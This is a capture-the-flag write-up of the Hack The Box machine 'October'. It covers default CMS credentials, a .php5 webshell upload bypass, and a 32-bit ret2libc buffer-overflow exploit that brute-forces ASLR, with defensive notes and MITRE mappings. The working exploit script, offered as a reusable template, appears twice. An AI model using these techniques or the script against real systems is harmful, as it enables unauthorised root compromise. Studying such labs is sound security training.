# October

![image.png](image.png)

# Context

Lab link: [https://app.hackthebox.com/machines/October](https://app.hackthebox.com/machines/October)

Suggested tools: `nmap`, `curl`, pwntools (`cyclic`, `gdb` integration), `gdb`, `checksec`, `objdump`, `readelf`, `strings`, `Python3`

Tactics: Reconnaissance → Initial Access → Execution → Defense Evasion → Discovery → Credential Access → Privilege Escalation

# Scenario

October is a fairly easy machine to gain an initial foothold on, however it presents a fair challenge for users who have never worked with NX/DEP or ASLR while exploiting buffer overflows.

# Questions

Q1- How many TCP ports are listening on October?

Answer: 2

Reason: Scanning `october.htb` with `nmap -sC -sV -p- october.htb -v -oN nmap.txt` found only two listening TCP ports: `22/tcp` running `OpenSSH 6.6.1p1` (Ubuntu 2ubuntu2.8) and `80/tcp` running `Apache httpd 2.4.7` hosting "October CMS - Vanilla". The HTTP OPTIONS check also revealed the risky methods `PUT`, `PATCH`, and `DELETE` enabled alongside `GET`/`HEAD`/`POST`.

```bash
$ nmap -sC -sV -p- october.htb -v -oN nmap.txt
Starting Nmap 7.991 ( https://nmap.org ) at 2026-11-27 13:48 -0500
NSE: Loaded 158 scripts for scanning.

Discovered open port 80/tcp on 10.129.96.113
Discovered open port 22/tcp on 10.129.96.113
                                                                             
PORT   STATE SERVICE VERSION                                                                                                            
22/tcp open  ssh     OpenSSH 6.6.1p1 Ubuntu 2ubuntu2.8 (Ubuntu Linux; protocol 2.0)                                                     
| ssh-hostkey:                                                                                                                          
|   1024 79:b1:35:b6:d1:25:12:a3:0c:b5:2e:36:9c:33:26:28 (DSA)                                                                          
|   2048 16:08:68:51:d1:7b:07:5a:34:66:0d:4c:d0:25:56:f5 (RSA)                                                                          
|   256 e3:97:a7:92:23:72:bf:1d:09:88:85:b6:6c:17:4e:85 (ECDSA)                                                                         
|_  256 89:85:90:98:20:bf:03:5d:35:7f:4a:a9:e1:1b:65:31 (ED25519)                                                                       
80/tcp open  http    Apache httpd 2.4.7 ((Ubuntu))                                                                                      
|_http-server-header: Apache/2.4.7 (Ubuntu)                                                                                             
|_http-title: October CMS - Vanilla
|_http-favicon: Unknown favicon MD5: 1D585CCF71E2EB73F03BCF484CFC2259                                                                   
| http-methods:                                                                                                                         
|   Supported Methods: GET HEAD POST PUT PATCH DELETE OPTIONS                                                                           
|_  Potentially risky methods: PUT PATCH DELETE                                                                                         
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel   
```

Q2- What is the name of the content management system responsible for the website on TCP 80?

Answer: `OctoberCMS`

Reason: Requesting the site root with `curl -sk <http://october.htb/`> and filtering for CMS references in the response confirmed `OctoberCMS` running the vanilla theme, with `RainLab.User`, `RainLab.Blog`, and `RainLab.Forum` plugins active.

```bash
$ curl -sk http://october.htb/ | grep -i cms
        <title>October CMS - Vanilla</title>
        <meta name="author" content="October CMS">
                    <p>Welcome to the vanilla theme for OctoberCMS!</p>
```

![image.png](image%201.png)

Q3- What is the default password for the admin user on October CMS?

Answer: `admin`

Reason: OctoberCMS ships with default admin credentials of `admin`/`admin`. Logging in at `http://october.htb/backend/` with those credentials succeeded, granting full CMS backend access (CMS, Media, Blog, Users, Settings).

![image.png](image%202.png)

Q4- Which of the following PHP extensions will run as PHP code and is not blocked by the CMS when doing a media upload? Choose from "`php`", "`php4`", "`php5`", "`phtml`", "`ppp`".

Answer: `php5`

Reason: Testing uploads against the Media library in the OctoberCMS backend showed common blocked extensions (`php`, `phtml`) rejected, while a file named `dr.php5` uploaded successfully, as shown in the Media library listing with a public URL. Since Apache on this host is typically configured to execute `.php5` through the PHP handler alongside `.php`, this extension bypasses the CMS's blocklist while still running as PHP code.

![image.png](image%203.png)

Q5- What user is the CMS running as on October?

Answer: `www-data`

Reason: Uploading a PHP webshell as `shell.php5` through the Media Manager (bypassing the extension blocklist per Q4) and accessing it at `http://october.htb/storage/app/media/shell.php5` confirmed uploads are served directly from `storage/app/media/` and execute as PHP. Running `id` through the shell confirmed the web server, and by extension the CMS, runs as `www-data`. A full TTY was then obtained via a Python PTY upgrade for a stable interactive shell.

![image.png](image%204.png)

```bash
# After clicking the public URL at: http://october.htb/storage/app/media/shell.php5
$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)

# Remote (after getting a basic shell):
python3 -c 'import pty; pty.spawn("/bin/bash")'

# Local (Ctrl-Z to background the shell, then):
stty raw -echo; fg

# Back on remote:
export TERM=xterm SHELL=/bin/bash
export PS1='$ '
stty rows 50 cols 200
reset
```

Q6- What user is the website running as?

Answer: `www-data`

Reason: Process listing confirmed Apache's master process runs as `root` (for binding privileged port 80), while every worker process runs as `www-data`. No separate `php-fpm` process exists, confirming PHP executes in-process via `mod_php` under the same `www-data` worker context that handles HTTP requests, matching the CMS execution user found in Q5.

```bash
$ ps aux | grep -i -E 'apache|httpd|php'
root      1317  0.0  2.2 115440 23444 ?        Ss   20:42   0:00 /usr/sbin/apache2 -k start
www-data  1323  0.1  2.7 120100 28308 ?        S    20:42   0:02 /usr/sbin/apache2 -k start
www-data  1324  0.1  2.7 119116 28316 ?        S    20:42   0:03 /usr/sbin/apache2 -k start
www-data  1325  0.1  2.9 119896 30628 ?        S    20:42   0:03 /usr/sbin/apache2 -k start
www-data  1535  0.2  2.9 120116 30568 ?        S    20:58   0:02 /usr/sbin/apache2 -k start
www-data  1536  0.2  2.9 119896 30052 ?        S    20:58   0:02 /usr/sbin/apache2 -k start
www-data  1559  0.2  2.7 118808 28392 ?        S    21:03   0:02 /usr/sbin/apache2 -k start
www-data  1586  0.1  2.5 117872 26432 ?        S    21:03   0:01 /usr/sbin/apache2 -k start
www-data  1613  0.2  2.5 118064 26620 ?        S    21:03   0:01 /usr/sbin/apache2 -k start
www-data  1616  0.1  2.8 118864 28724 ?        S    21:03   0:01 /usr/sbin/apache2 -k start
www-data  1681  0.0  0.6 115472  6220 ?        S    21:12   0:00 /usr/sbin/apache2 -k start
www-data  1709  0.0  0.0   2616   692 pts/0    S+   21:17   0:00 grep -i -E apache|httpd|php
```

Q7- Submit the flag located in the harry user's home directory.

Answer: [REDACTED]

Reason: Enumerating `/home` revealed a single user directory, `harry`. Listing its contents as `www-data` showed `user.txt` set world-readable (`-r--r--r-- 1 harry harry 33 Nov 27 20:43 user.txt`), a permissions misconfiguration allowing direct read access without any privilege escalation. The directory also contains `october-1.0.412.tar.gz`, the CMS's own source archive, useful for later source review.

```bash
$ ls -lah /home
total 12K
drwxr-xr-x  4 harry harry 4.0K Dec  6  2021 harry
$ pwd
/home/harry
$ cat user.txt 
```

Q8- What is the full path of the file owned by root that has the `SetUID` permission and is custom to October?

Answer: `/usr/local/bin/ovrflw`

Reason: Searching the filesystem for SUID binaries with `find / -perm -4000 -type f 2>/dev/null` returned the usual set of standard Linux LOLBins, plus one non-standard entry: `/usr/local/bin/ovrflw`. Its name and non-standard location strongly suggest a custom root-owned binary intended as the box's buffer overflow vector.

```bash
$ find / -perm -4000 -type f 2>/dev/null
[...all normal LOLbins...]
/usr/local/bin/ovrflw
```

Q9- How many bytes into the user provided data that will overwrite EIP?

Answer: 112

Reason: Generating a unique cyclic pattern with `pwn cyclic 200` and feeding it to `ovrflw` inside gdb caused a crash with `EIP = 0x62616164`. Looking up that value with `pwn cyclic -l 0x62616164` returned `112`, confirmed exact by resending 112 junk bytes followed by a `BBBB` marker and verifying `EIP` became exactly `0x42424242`.

```python
$ gdb -q --args ./ovrflw $(pwn cyclic 200)
Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()

$ pwn cyclic -l 0x62616164
112

$ gdb -q --args ./ovrflw $(python3 -c "print('A'*112 + 'BBBB')")
Program received signal SIGSEGV, Segmentation fault.
0x42424242 in ?? ()
```

Q10- Submit the flag located in the root user's home directory.

Answer: [REDACTED]

Reason: With `checksec` confirming no stack canary, no PIE, and NX enabled on the SUID binary `ovrflw`, a classic stack buffer overflow was confirmed exploitable via `strcpy`. The exact offset to the return address (112 bytes) was found using a `pwntools` cyclic pattern and verified in `gdb`. Since 32-bit Linux ASLR only randomizes roughly 8 bits of the libc base address (~256 possible values), a ret2libc payload was built using `system()`'s and `/bin/sh`'s fixed offsets within `libc.so.6` (`readelf`/`strings`), then brute-forced in a loop against the SUID binary until the kernel's randomly chosen libc base matched the hardcoded guess. This produced a root shell via the binary's SUID bit, confirmed with `id` showing `euid=0(root)`.

```bash
$ checksec --file=ovrflw 
RELRO           STACK CANARY      NX            PIE             RPATH      RUNPATH      Symbols         FORTIFY Fortified       Fortifiable     FILE
Partial RELRO   No canary found   NX enabled    No PIE          No RPATH   No RUNPATH   69 Symbols        No    0               2      ovrflw

$ pwn cyclic 200
aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab

$ chmod +x ovrflw

$ gdb -q --args ./ovrflw $(pwn cyclic 200)
Reading symbols from ./ovrflw...
(No debugging symbols found in ./ovrflw)
(gdb) run
Starting program: /home/kali/ctf_stuff/offsec/htb_October/ovrflw aaaabaaacaaadaaaeaaafaaagaaahaaaiaaajaaakaaalaaamaaanaaaoaaapaaaqaaaraaasaaataaauaaavaaawaaaxaaayaaazaabbaabcaabdaabeaabfaabgaabhaabiaabjaabkaablaabmaabnaaboaabpaabqaabraabsaabtaabuaabvaabwaabxaabyaab
[Thread debugging using libthread_db enabled]
Using host libthread_db library "/usr/lib/x86_64-linux-gnu/libthread_db.so.1".

Program received signal SIGSEGV, Segmentation fault.
0x62616164 in ?? ()
# That hex value, read as ASCII bytes (little-endian, reversed), spells out "daab"

$ pwn cyclic -l 0x62616164
112
# Offset confirmed: 112 bytes of junk before the return address

$ ldd /usr/local/bin/ovrflw | grep libc
        libc.so.6 => /lib/i386-linux-gnu/libc.so.6 (0xb75b6000)

$ readelf -s /lib/i386-linux-gnu/libc.so.6 | grep system
   243: 0011b710    73 FUNC    GLOBAL DEFAULT   12 svcerr_systemerr@@GLIBC_2.0
   620: 00040310    56 FUNC    GLOBAL DEFAULT   12 __libc_system@@GLIBC_PRIVATE
  1443: 00040310    56 FUNC    WEAK   DEFAULT   12 system@@GLIBC_2.0

$ strings -t x /lib/i386-linux-gnu/libc.so.6 | grep /bin/sh
 162bac /bin/sh
 
cat > test.py << 'EOF'
import struct, subprocess

libcBase = 0xb75b6000
systemOffset = 0x00040310
binShOffset = 0x00162bac

libcAddress = struct.pack("<I", libcBase + systemOffset)
exitAddress = struct.pack("<I", 0xd34db33f)
binShAddress = struct.pack("<I", libcBase + binShOffset)

payload = b"\x90" * 112
payload += libcAddress
payload += exitAddress
payload += binShAddress

i = 0
while True:
    i += 1
    if i % 10 == 0:
        print("Attempts: " + str(i))
    subprocess.call([b"/usr/local/bin/ovrflw", payload])
EOF

$ python3 test.py 
Attempts: 10
Attempts: 20
ovrflw: ../stdlib/strtod_l.c:1648: ____wcstold_l_internal: Assertion `empty == 1' failed.
[...]
Attempts: 290
ovrflw: malloc.c:4070:
        <: Assertion `heap->ar_ptr == av' failed.
Attempts: 300
Attempts: 310
Attempts: 320
$ id
uid=33(www-data) gid=33(www-data) euid=0(root) groups=0(root),33(www-data)
$ cat /root/root.txt
```

## Classic Stack Buffer Overflow via Unsafe Function

Every function call reserves a fixed chunk of stack memory for its local variables. Right after that buffer sits the return address — the CPU's breadcrumb back to the caller. Unsafe functions like `strcpy`, `gets`, and `sprintf` copy input into that buffer with no length check. Feed them more bytes than the buffer holds and the overflow keeps writing — past the buffer, past saved registers, into the return address itself. When the function returns, the CPU pops whatever is now sitting at that slot and jumps there. You control what's there. You control where it jumps. 

**Conditions:**

| # | Condition | Side | Check Command | Pass Signal |
| --- | --- | --- | --- | --- |
| 1 | Binary uses unsafe input function (`gets`, `strcpy`, `sprintf`, etc.) | Target | `objdump -d <binary> | grep -E "gets|strcpy|sprintf"` | Symbol present |
| 2 | No stack canary | Target | `checksec --file=<binary>` | `No canary found` |
| 3 | No PIE | Target | `checksec --file=<binary>` | `No PIE` |
| 4 | NX disabled (stack is executable) | Target | `checksec --file=<binary>` | `NX disabled` |
| 5 | Overflow reachable via user input | Target | `<binary> $(python3 -c "print('A'*200)")` | Segfault confirmed |
| 6 | Buffer size and offset to return address identified | Attacker | `cyclic 200` → crash → `cyclic -l <EIP value>` | Exact offset returned |

**Scoring:** Conditions 1–3 confirm the vulnerability exists and is reachable without mitigations blocking the path. Condition 4 is what separates this pattern from the ROP variant — NX must be **off** for shellcode-on-stack to execute. Condition 5 is attacker-side recon, always infra. Agent scores **PARTIAL** on 1–3; **VIABLE** with 4 confirmed.

**Key Pivot:** The vulnerability is never in the overflow mechanic itself — it's in the absence of a bounds check at the call site. `checksec` confirms whether mitigations would block exploitation, not whether the bug exists. The bug comes from reading the code or fuzzing with long input.

**Defsec:** Compile with stack canaries (`-fstack-protector-all`), enable PIE (`-fPIE -pie`), enable NX (default on modern compilers); replace unsafe functions with bounded equivalents (`strncpy`, `fgets`, `snprintf`); use AddressSanitizer during development.

## NX Bypass via ret2libc ROP Chain

NX marks the stack as non-executable — jumping into your shellcode buffer now crashes instead of running it. ret2libc technique sidesteps this entirely: instead of injecting new code, you redirect execution to `system()`, a real function already sitting in `libc`, already in executable memory. You arrange the stack so `/bin/sh`'s address lands where `system()` expects its argument. The function "returns" straight into `system("/bin/sh")`. No injected code. No NX violation. Just the program's own loaded libraries, called in the order you dictate. It's just a name for the technique — "return to `libc`." As in: instead of returning to your shellcode, you return to a function that already lives in libc.

**Conditions:**

| # | Condition | Side | Check Command | Pass Signal |
| --- | --- | --- | --- | --- |
| 1 | Stack buffer overflow reachable (unsafe function, no canary) | Target | Same as Pattern 1 conditions 1–2 | Confirmed |
| 2 | NX enabled (stack non-executable) | Target | `checksec --file=<binary>` | `NX enabled` |
| 3 | No PIE | Target | `checksec --file=<binary>` | `No PIE` |
| 4 | ASLR disabled or libc base fixed | Target | `cat /proc/sys/kernel/randomize_va_space` | `0` or `1` |
| 5 | libc base address resolved | Target | `ldd <binary>` run twice — same address both times | Base address fixed |
| 6 | `system()` address resolved in libc | Attacker | `readelf -s libc.so | grep system` + libc base | Absolute address calculated |
| 7 | `/bin/sh` string address resolved in libc | Attacker | `strings -a -t x libc.so | grep /bin/sh` + libc base | Absolute address calculated |
| 8 | `pop rdi; ret` gadget found (x64) or `pop ebx; ret` (x86) | Attacker | `ROPgadget --binary <binary>` or `ropper` | Gadget address found |
| 9 | Buffer offset to return address identified | Attacker | `cyclic 200` → crash → `cyclic -l <EIP value>` | Exact offset returned |

**Scoring:** Conditions 1–2 establish the exploit path. Condition 3 makes it reliable without a leak. Conditions 4–7 are all attacker-side build steps — agent scores **PARTIAL** on 1–3; **VIABLE** once gadget and libc addresses resolved.

**Key Pivot:** ROP doesn't bypass NX by defeating it — it makes NX irrelevant. Every gadget executes in already-mapped executable regions. The CPU never touches the stack as code. The chain is entirely data on the stack that the `ret` instruction uses as a jump table.

**Defsec:** Enable ASLR system-wide (`/proc/sys/kernel/randomize_va_space = 2`) to defeat fixed-address assumptions; compile with PIE to randomize binary base; use full RELRO to prevent GOT overwrites; consider stack canaries as a first line; modern mitigations (CET/IBT on newer CPUs) can restrict `ret` chaining at hardware level.

## 32 Bit ASLR Bypass via ret2libc Brute Force

ASLR randomizes where libc loads in memory each run — making ret2libc fail because your hardcoded `system()` address is wrong every time. On 64-bit systems this is a real wall: billions of possible addresses, brute force is hopeless. On 32-bit systems ASLR only has about 8 bits of actual randomness — roughly 256 possible base addresses. So instead of finding the right address, you just keep firing the same payload in a loop. Most attempts crash. Eventually the random base lands exactly where you calculated, your addresses align, and you get a shell. No new technique — same ret2libc payload, just wrapped in a retry loop.

| # | Condition | Side | Check Command | Pass Signal |
| --- | --- | --- | --- | --- |
| 1 | Stack buffer overflow reachable (unsafe function, no canary) | Target | Same as Pattern 1 conditions 1–2 | Confirmed |
| 2 | NX enabled | Target | `checksec --file=<binary>` | `NX enabled` |
| 3 | No PIE | Target | `checksec --file=<binary>` | `No PIE` |
| 4 | ASLR enabled | Target | `cat /proc/sys/kernel/randomize_va_space` | `2` |
| 5 | Binary is 32-bit (low ASLR entropy — ~256 possible base addresses) | Target | `file <binary>` | `ELF 32-bit` |
| 6 | No crash detection or rate limiting on target process | Target | Run exploit repeatedly — process respawns or accepts input again immediately | No lockout observed |
| 7 | libc base address calculated from one sample run | Attacker | `ldd <binary>` once to get a sample base; extract `system()` and `/bin/sh` offsets from that libc version | Offsets calculated |
| 8 | `pop ebx; ret` gadget (or equivalent) found | Attacker | `ROPgadget --binary <binary>` | Gadget address found |
| 9 | Brute force loop script written — retries payload until base address aligns | Attacker | Script loops `subprocess` calls with fixed payload until shell returned | Shell obtained |

**Scoring:** Conditions 1–6 fully target-side checkable; agent scores **PARTIAL** on those. **VIABLE** once offsets calculated and brute force confirmed feasible.

**Key Pivot:** The exploit payload is identical to Pattern 2 — same `system()`, same `/bin/sh`, same gadget. The only difference is the loop. 32-bit ASLR has ~8 bits of entropy in practice (~256 possible base addresses), making brute force trivial with no rate limiting. On 64-bit this approach is computationally infeasible (~28+ bits of entropy = billions of possible addresses).

**Defsec:** Migrate to 64-bit binaries (entropy jumps from ~256 to billions of possible addresses); implement crash detection and process restart rate limiting; combine ASLR with stack canaries and full RELRO; monitor for rapid repeated process invocations from the same source.

### Brute Force Script on 32 Bit ASLR

```python
"""
ret2libc brute-force template (32-bit, NX enabled, no canary, no PIE).

Before reusing against a different binary/target, recalculate every value below:

- libcBase:     a guessed base address for libc (loop/brute-force this since
                ASLR randomizes it per run; the loop below retries until a
                guess lands correctly). Starting point can come from `ldd
                <binary>` on the target, but the real value changes each
                execution.
- systemOffset: fixed offset of system() inside the TARGET's own libc build.
                Find via: readelf -s <path-to-target-libc.so.6> | grep system
- binShOffset:  fixed offset of the "/bin/sh" string inside the TARGET's own
                libc build. Find via:
                strings -t x <path-to-target-libc.so.6> | grep /bin/sh
- 112 (junk padding before libcAddress):
                offset from buffer start to the return address, specific to
                THIS vulnerable binary. Find via pwntools cyclic pattern +
                cyclic_find against a crash, not reusable across binaries.
- "/usr/local/bin/ovrflw":
                path to the vulnerable SUID binary on the target.

Everything else (payload structure, retry loop) is reusable as-is.
"""
import struct, subprocess

libcBase = 0xb75b6000
systemOffset = 0x00040310
binShOffset = 0x00162bac

libcAddress = struct.pack("<I", libcBase + systemOffset)
exitAddress = struct.pack("<I", 0xd34db33f)
binShAddress = struct.pack("<I", libcBase + binShOffset)

payload = b"\x90" * 112
payload += libcAddress
payload += exitAddress
payload += binShAddress

i = 0
while True:
    i += 1
    if i % 10 == 0:
        print("Attempts: " + str(i))
    subprocess.call([b"/usr/local/bin/ovrflw", payload])
```

# Attack Architecture

```mermaid
flowchart TD
    %% Main path (systems / loot)
    A[Kali] --> B[october.htb]
    B --> C[admin:admin creds]
    C --> D[www-data shell]
    D --> E[user.txt]
    D --> F[root shell]
    F --> G[root.txt]

    %% Techniques on the side
    A -.-> T1[nmap full TCP sweep]
    B -.-> T2[default OctoberCMS creds]
    C -.-> T3[php5 media upload bypass]
    D -.-> T4[world-readable perms misconfig]
    D -.-> T5[SUID ovrflw ret2libc brute-force]

    %% Colors
    style A fill:#1e3a5f,stroke:#4a6fa5,color:#fff
    style B fill:#1e3a5f,stroke:#4a6fa5,color:#fff
    style D fill:#1e3a5f,stroke:#4a6fa5,color:#fff
    style F fill:#1e3a5f,stroke:#4a6fa5,color:#fff
    style C fill:#2d6a4f,stroke:#40916c,color:#fff
    style E fill:#2d6a4f,stroke:#40916c,color:#fff
    style G fill:#2d6a4f,stroke:#40916c,color:#fff

    style T1 fill:#5c1a1a,stroke:#c1121f,color:#fff
    style T2 fill:#5c1a1a,stroke:#c1121f,color:#fff
    style T3 fill:#5c1a1a,stroke:#c1121f,color:#fff
    style T4 fill:#5c1a1a,stroke:#c1121f,color:#fff
    style T5 fill:#5c1a1a,stroke:#c1121f,color:#fff
```

# Attack Chain

| Stage | Detail | MITRE |
| --- | --- | --- |
| Reconnaissance | Full TCP port sweep with `nmap -sC -sV -p-` found 22/tcp (OpenSSH) and 80/tcp (OctoberCMS "Vanilla") | T1595 |
| Initial Access | Logged into `/backend/` with OctoberCMS default credentials `admin`:`admin` | T1078.001 |
| Defense Evasion | Media Manager upload filter blocked .php/.phtml but allowed .php5, a legacy Apache-handler alias that still executes as PHP | T1140 |
| Execution | Uploaded shell.php5 to storage/app/media/, executed via direct request, gained www-data shell | T1505.003 |
| Discovery | `find / -perm -4000` located a custom SUID-root binary, `/usr/local/bin/ovrflw` | T1083 |
| Credential/Flag Access | `/home/harry/user.txt` found world-readable, read directly as www-data | T1552.001 |
| Privilege Escalation | `checksec` confirmed no canary/no PIE/NX on `ovrflw`; `strcpy overflow offset` (112 bytes) found via pwntools cyclic pattern | T1203 |
| Privilege Escalation | Built ret2libc payload from target's own `system()`/`/bin/sh libc` offsets; brute-forced weak 32-bit ASLR (~256 possible bases) in a loop until the SUID binary dropped a root shell | T1068 |

## Attack Tree

```bash
HTB October (october.htb)
│
├── 80/tcp -- OctoberCMS "Vanilla" backend
│   └── admin:admin default credentials
│       └── Media Manager .php5 upload bypass
│           └── shell as www-data
│               │
│               ├── /home/harry/user.txt (world-readable)
│               │   └── [USER FLAG - REDACTED]
│               │
│               └── SUID /usr/local/bin/ovrflw (strcpy overflow)
│                   └── ret2libc payload (offset 112, system()+/bin/sh)
│                       └── brute-force weak 32-bit ASLR (~256 bases)
│                           └── root shell (euid=0)
│                               └── [ROOT FLAG - REDACTED]
```

# Artifacts

| Category | Type | Value |
| --- | --- | --- |
| Delivery | CMS | OctoberCMS (Vanilla theme) |
|  | Backend login | admin : admin |
| Dropped File | Webshell | shell.php5 |
|  | Upload path | `/storage/app/media/shell.php5` |
| Host Indicators | SUID binary | `/usr/local/bin/ovrflw` |
|  | checksec result | No canary, No PIE, NX enabled, Partial RELRO |
| Discovery | Users directory | `/home/harry` |
|  | World-readable flag | `/home/harry/user.txt` |
| Exploitation | Overflow offset | 112 bytes (via pwn cyclic) |
|  | Libc path | `/lib/i386-linux-gnu/libc.so.6` |
|  | system() offset | 0x00040310 |
|  | `/bin/sh` offset | 0x00162bac |
|  | Exploit script | october_bof.py (ret2libc brute-force) |
| Flags | User flag | [REDACTED] |
|  | Root flag | [REDACTED] |

# Lab Insights

1. Default credentials on admin panels remain one of the most common real-world initial access vectors, not just a CTF trope. OctoberCMS's `admin`/`admin` default, left unchanged post-install, granted full backend access with file-upload capability, turning a CMS administration feature into a remote code execution primitive. (T1078.001)
2. Extension-based upload blocklists are fragile because they require the defender to enumerate every alias a web server's handler config recognizes, not just the "obvious" extension. Apache's legacy `AddHandler` rules for `.php3`/`.php4`/`.php5`/`.phtml` meant the Media Manager's blocklist (likely targeting only `.php`) left a fully-executable gap, letting `shell.php5` run as PHP despite the filter. (T1140)
3. Weak randomization is as dangerous as no randomization at all. NX/DEP correctly blocked the simplest shellcode-on-stack exploit on `ovrflw`, but 32-bit Linux's limited ~8 bits of ASLR entropy for the libc base (~256 possible values) made a hardcoded ret2libc payload brute-forceable in a few hundred attempts, no information leak required. A mitigation's real strength is measured by its entropy, not just whether it is "enabled". (T1068)